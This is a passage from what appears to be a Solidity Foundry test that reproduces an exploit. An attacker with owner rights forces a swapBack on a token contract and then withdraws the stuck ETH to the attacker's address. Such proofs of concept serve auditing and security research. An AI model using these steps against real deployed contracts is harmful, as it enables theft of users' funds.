          );
          vm.stopPrank();

          // 4. Attacker (as owner) executes the rest of the exploit.
          vm.startPrank(attacker);

          // Verify precondition: contract now holds enough fee tokens.
          assertTrue(target.balanceOf(address(target)) >= target.swapTokensAtAmount());

          // 5. Trigger the swapBack, which gets ETH stuck in the contract.
          target.forceSwapBack();

          // 6. Withdraw the stuck ETH to the attacker's address.
          target.withdrawStuckETH();
          vm.stopPrank();
    }

    // ─── Receive ETH ─────────────────────────────────────────
